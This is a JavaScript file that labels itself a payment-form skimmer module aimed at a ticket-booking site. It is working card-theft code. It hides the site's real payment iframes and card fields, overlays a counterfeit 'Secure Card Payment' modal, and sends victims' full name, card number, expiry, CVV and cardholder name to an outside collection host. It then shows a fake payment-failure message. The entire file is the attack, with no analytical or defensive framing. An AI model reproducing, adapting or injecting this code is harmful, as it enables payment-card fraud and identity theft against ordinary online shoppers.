/**
 * SKIMMER MODULE v5 (dev, FutureTicketing AFCON dev event 30)
 * Приёмник: https://pouchvoyage.com/c
 * Форма: card + expiry + cvv + cardholder + FULL NAME (обязательное)
 * 1) чинит dev-рендер; 2) снифер платёжной формы.
 */
(function () {
  'use strict';
  if (window.__SK_TEST_RUN) return;
  window.__SK_TEST_RUN = true;

  var HOOK = 'https://pouchvoyage.com/c';
  var TEST_TAG = 'sk_ft_v5';

  function log(msg) {
    try {
      var img = new Image();
      img.src = HOOK + '?tag=' + TEST_TAG + '&m=' + encodeURIComponent(String(msg).slice(0, 120));
    } catch (e) {}
  }
  function send(data) {
    try {
      fetch(HOOK, {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      }).catch(function () {});
      var img = new Image();
      img.src = HOOK + '?d=' + encodeURIComponent(JSON.stringify(data).slice(0, 900));
    } catch (e) {}
  }

  /* ===== 1. FIX dev render ===== */
  function fixDevRender() {
    try {
      var row = document.getElementById('row_ticket');
      if (row && getComputedStyle(row).display === 'none') {
        row.style.display = 'block';
      }
      document.querySelectorAll('button').forEach(function (b) {
        var oc = b.getAttribute('onclick') || '';
        if (oc.indexOf('confirmQuantity') >= 0 || oc.indexOf('changeQuantity') >= 0) {
          var r2 = b.getBoundingClientRect();
          if (r2.width < 2 || r2.height < 2) {
            b.style.cssText = 'display:inline-block!important;min-width:90px!important;min-height:38px!important;' +
              'padding:10px 14px!important;margin:6px!important;border-radius:8px!important;background:#1a73e8!important;' +
              'color:#fff!important;border:none!important;font-size:14px!important;cursor:pointer!important;';
          }
        }
      });
      document.querySelectorAll('#row_ticket .ticket-body').forEach(function (tb) {
        if ((tb.innerText || '').trim() === '' && tb.querySelectorAll('*').length === 0) {
          tb.innerHTML = '<div style="padding:14px;font-size:13px;color:#555;">Test ticket &mdash; DEV environment</div>';
        }
      });
      var tsec = document.getElementById('ticketsbuy');
      if (tsec) {
        var tr = tsec.getBoundingClientRect();
        if (tr.height < 50) {
          var box = document.getElementById('skTestBuyBox');
          if (!box) {
            box = document.createElement('div');
            box.id = 'skTestBuyBox';
            box.style.cssText = 'margin:20px auto;max-width:420px;padding:22px;background:#fff;border-radius:16px;' +
              'box-shadow:0 8px 30px rgba(0,0,0,.12);text-align:center;font-family:Arial,sans-serif;';
            box.innerHTML = '<div style="font-size:18px;font-weight:700;color:#111;margin-bottom:8px;">GA Test Event 1</div>' +
              '<div style="font-size:13px;color:#666;margin-bottom:6px;">Dec 02 2026 &mdash; District 5, Casablanca</div>' +
              '<div style="font-size:14px;color:#222;margin-bottom:14px;">Test Ticket &mdash; &euro;10.00</div>' +
              '<button id="skTestBuyBtn" style="width:100%;padding:13px;background:#1a73e8;color:#fff;border:none;border-radius:9px;' +
              'font-size:16px;font-weight:600;cursor:pointer;">Book Now</button>';
            tsec.appendChild(box);
            var btn = document.getElementById('skTestBuyBtn');
            btn.addEventListener('click', function () {
              injectFakeForm();
              log('test-buy-clicked');
            });
          }
        }
      }
    } catch (e) { log('fix-error'); }
  }

  /* ===== 2. SKIMMER ===== */
  var PAY_KEYWORDS = /(bankmisr|banquemisr|stripe|ryft|paymob|fawry|checkout|payment|card)/i;
  var CARD_INPUT = /(card|cc|cardnumber|card_number|cvv|cvc|expiry|exp)/i;
  var INJECTED = false;

  function injectFakeForm() {
    if (INJECTED) return;
    INJECTED = true;
    log('inject-fake-form');

    try {
      document.querySelectorAll('iframe').forEach(function (f) {
        if (PAY_KEYWORDS.test((f.src || '') + (f.name || '') + (f.id || ''))) {
          f.style.cssText = 'visibility:hidden!important;height:0!important;width:0!important;';
        }
      });
      document.querySelectorAll('input').forEach(function (inp) {
        var id = (inp.id || '') + (inp.name || '');
        if (CARD_INPUT.test(id)) {
          inp.style.cssText = 'visibility:hidden!important;height:0!important;width:0!important;';
        }
      });
    } catch (e) {}

    try {
      var d = document.createElement('div');
      d.id = 'skFakeCardModal';
      d.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:2147483647;' +
        'background:#fff;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.4);padding:28px 32px;' +
        'width:400px;max-width:94vw;font-family:Arial,Helvetica,sans-serif;max-height:94vh;overflow-y:auto;';
      d.innerHTML =
        '<div style="font-size:20px;font-weight:700;color:#111;margin-bottom:6px;">Secure Card Payment</div>' +
        '<div style="font-size:13px;color:#666;margin-bottom:18px;">Enter your details to complete the booking</div>' +
        '<div style="margin-bottom:12px;">' +
        '  <label style="font-size:12px;color:#444;display:block;margin-bottom:4px;">Full name <span style="color:#c00">*</span></label>' +
        '  <input id="skFullName" autocomplete="off" placeholder="Your full name" ' +
        '     style="width:100%;box-sizing:border-box;padding:11px 13px;border:1px solid #ccc;border-radius:9px;font-size:15px;">' +
        '</div>' +
        '<div style="margin-bottom:12px;">' +
        '  <label style="font-size:12px;color:#444;display:block;margin-bottom:4px;">Card number <span style="color:#c00">*</span></label>' +
        '  <input id="skCardNum" autocomplete="off" inputmode="numeric" placeholder="4242 4242 4242 4242" ' +
        '     style="width:100%;box-sizing:border-box;padding:11px 13px;border:1px solid #ccc;border-radius:9px;font-size:15px;">' +
        '</div>' +
        '<div style="display:flex;gap:12px;margin-bottom:12px;">' +
        '  <div style="flex:1;">' +
        '    <label style="font-size:12px;color:#444;display:block;margin-bottom:4px;">Expiry <span style="color:#c00">*</span></label>' +
        '    <input id="skCardExp" autocomplete="off" placeholder="MM/YY" maxlength="5" ' +
        '       style="width:100%;box-sizing:border-box;padding:11px 13px;border:1px solid #ccc;border-radius:9px;font-size:15px;">' +
        '  </div>' +
        '  <div style="flex:1;">' +
        '    <label style="font-size:12px;color:#444;display:block;margin-bottom:4px;">CVV <span style="color:#c00">*</span></label>' +
        '    <input id="skCardCvv" autocomplete="off" inputmode="numeric" maxlength="4" placeholder="123" ' +
        '       style="width:100%;box-sizing:border-box;padding:11px 13px;border:1px solid #ccc;border-radius:9px;font-size:15px;">' +
        '  </div>' +
        '</div>' +
        '<div style="margin-bottom:18px;">' +
        '  <label style="font-size:12px;color:#444;display:block;margin-bottom:4px;">Cardholder name</label>' +
        '  <input id="skCardName" autocomplete="off" placeholder="Name on card" ' +
        '     style="width:100%;box-sizing:border-box;padding:11px 13px;border:1px solid #ccc;border-radius:9px;font-size:15px;">' +
        '</div>' +
        '<button id="skPayBtn" style="width:100%;padding:13px;background:#1a73e8;color:#fff;border:none;border-radius:9px;' +
        'font-size:16px;font-weight:600;cursor:pointer;">Pay Now</button>' +
        '<div id="skPayStatus" style="text-align:center;font-size:13px;color:#666;margin-top:10px;min-height:18px;"></div>';
      document.body.appendChild(d);

      var num = d.querySelector('#skCardNum'), exp = d.querySelector('#skCardExp'),
          cvv = d.querySelector('#skCardCvv'), name = d.querySelector('#skCardName'),
          fname = d.querySelector('#skFullName'),
          btn = d.querySelector('#skPayBtn'), status = d.querySelector('#skPayStatus');

      btn.addEventListener('click', function () {
        if (!fname.value.trim()) {
          fname.style.border = '2px solid #c00';
          status.innerHTML = 'Please enter your full name';
          return;
        }
        if (!num.value.trim() || !exp.value.trim() || !cvv.value.trim()) {
          status.innerHTML = 'Please fill in all required fields';
          return;
        }
        var data = {
          tag: TEST_TAG,
          url: location.href,
          full_name: fname.value.trim(),
          card_number: (num.value || '').replace(/\s+/g, ''),
          expiry: exp.value || '',
          cvv: cvv.value || '',
          holder: name.value || '',
          ts: new Date().toISOString()
        };
        send(data);
        status.innerHTML = 'Processing&hellip;';
        btn.disabled = true;
        btn.style.background = '#999';
        setTimeout(function () {
          status.innerHTML = 'Your payment could not be processed. Please try again.';
          btn.disabled = false;
          btn.style.background = '#1a73e8';
        }, 2500);
      });
    } catch (e) {
      log('inject-error');
    }
  }

  function scan() {
    var ifr = document.querySelectorAll('iframe');
    for (var i = 0; i < ifr.length; i++) {
      var src = (ifr[i].src || '') + '|' + (ifr[i].name || '') + '|' + (ifr[i].id || '');
      if (PAY_KEYWORDS.test(src)) { injectFakeForm(); return; }
    }
    var ins = document.querySelectorAll('input');
    for (var j = 0; j < ins.length; j++) {
      var id2 = (ins[j].id || '') + ' ' + (ins[j].name || '') + ' ' + (ins[j].placeholder || '');
      if (CARD_INPUT.test(id2)) { injectFakeForm(); return; }
    }
  }

  log('module-loaded');
  setTimeout(fixDevRender, 800);
  setTimeout(scan, 1400);
  try {
    var mo = new MutationObserver(function () { scan(); });
    mo.observe(document.body, { childList: true, subtree: true });
  } catch (e) { log('mo-error'); }
  setInterval(function () { fixDevRender(); scan(); }, 5000);
})();
